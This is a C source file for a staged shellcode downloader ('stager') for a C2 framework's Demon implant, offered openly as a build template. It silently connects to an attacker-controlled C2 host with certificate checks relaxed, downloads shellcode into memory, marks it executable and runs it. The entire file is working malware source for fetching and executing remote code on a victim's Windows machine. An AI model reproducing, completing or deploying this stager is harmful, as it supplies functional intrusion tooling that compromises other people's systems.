/**
 * @file MainStager.c
 * @brief Staged shellcode downloader stager for the Demon agent.
 *
 * This template is compiled as the Windows Shellcode Staged payload format.
 * It is a minimal Windows EXE that connects to the C2 listener at run time,
 * downloads the full Demon shellcode payload over HTTP(S), allocates executable
 * memory, copies the shellcode into it, and transfers control to it.
 *
 * The builder injects the following preprocessor defines at compile time:
 *   STAGER_HOST      = {0xNN, ...}  — null-terminated C string: C2 hostname
 *   STAGER_HOST_LEN  = N            — byte length of host string, excluding NUL
 *   STAGER_PORT      = NNNN         — TCP port (INTERNET_PORT)
 *   STAGER_URI       = {0xNN, ...}  — null-terminated C string: request URI path
 *   STAGER_URI_LEN   = N            — byte length of URI string, excluding NUL
 *   STAGER_SECURE    = 0 or 1       — 1 = HTTPS, 0 = HTTP
 *
 * Compile flags (MinGW cross-compiler):
 *   -mwindows -lwininet
 *   -e WinMain  (x64)  or  -e _WinMain  (x86)
 *
 * No CRT, no debug output, no error dialogs.  On any failure the process
 * returns a non-zero exit code and exits silently.
 */

#include <windows.h>
#include <wininet.h>

/* Maximum number of bytes to download (16 MiB). */
#define STAGER_MAX_PAYLOAD_BYTES (16UL * 1024UL * 1024UL)

/* C2 connection parameters injected by the builder. */
static const CHAR s_host[] = STAGER_HOST;
static const CHAR s_uri[]  = STAGER_URI;

/**
 * WinMain — entry point.
 *
 * Opens an internet session, connects to the C2 host, issues a GET request
 * for the stage-1 shellcode payload, downloads it into an RW allocation,
 * then changes the region to RX and executes it.
 */
INT WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    INT       nShowCmd )
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect  = NULL;
    HINTERNET hRequest  = NULL;
    LPVOID    pPayload  = NULL;
    DWORD     dwTotal   = 0;
    DWORD     dwRead    = 0;
    DWORD     dwOldProt = 0;
    DWORD     dwFlags   = 0;
    WCHAR     wHost[256];
    WCHAR     wUri[256];

    /* Convert host and URI from narrow to wide for WinINet. */
    if ( 0 == MultiByteToWideChar( CP_ACP, 0, s_host, -1, wHost, 256 ) )
        return 1;
    if ( 0 == MultiByteToWideChar( CP_ACP, 0, s_uri, -1, wUri, 256 ) )
        return 1;

    hInternet = InternetOpenW( L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
    if ( !hInternet )
        return 1;

    hConnect = InternetConnectW(
        hInternet,
        wHost,
        (INTERNET_PORT)STAGER_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0 );
    if ( !hConnect )
        goto cleanup;

    dwFlags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
#if STAGER_SECURE
    dwFlags |= INTERNET_FLAG_SECURE
             | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
             | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
#endif

    hRequest = HttpOpenRequestW(
        hConnect,
        L"GET",
        wUri,
        NULL, NULL, NULL,
        dwFlags, 0 );
    if ( !hRequest )
        goto cleanup;

    if ( !HttpSendRequestW( hRequest, NULL, 0, NULL, 0 ) )
        goto cleanup;

    /* Allocate a writable buffer for the incoming payload. */
    pPayload = VirtualAlloc( NULL, STAGER_MAX_PAYLOAD_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !pPayload )
        goto cleanup;

    /* Stream the response body into the buffer. */
    while ( InternetReadFile( hRequest,
                              (LPBYTE)pPayload + dwTotal,
                              4096,
                              &dwRead ) && dwRead > 0 )
    {
        dwTotal += dwRead;
        if ( dwTotal >= STAGER_MAX_PAYLOAD_BYTES )
            break;
    }

    if ( dwTotal == 0 )
        goto cleanup;

    /* Re-protect as executable and hand off to the shellcode. */
    if ( !VirtualProtect( pPayload, dwTotal, PAGE_EXECUTE_READ, &dwOldProt ) )
        goto cleanup;

    ( (void (*)()) pPayload )();

cleanup:
    if ( hRequest  ) InternetCloseHandle( hRequest  );
    if ( hConnect  ) InternetCloseHandle( hConnect  );
    if ( hInternet ) InternetCloseHandle( hInternet );
    return 0;
}
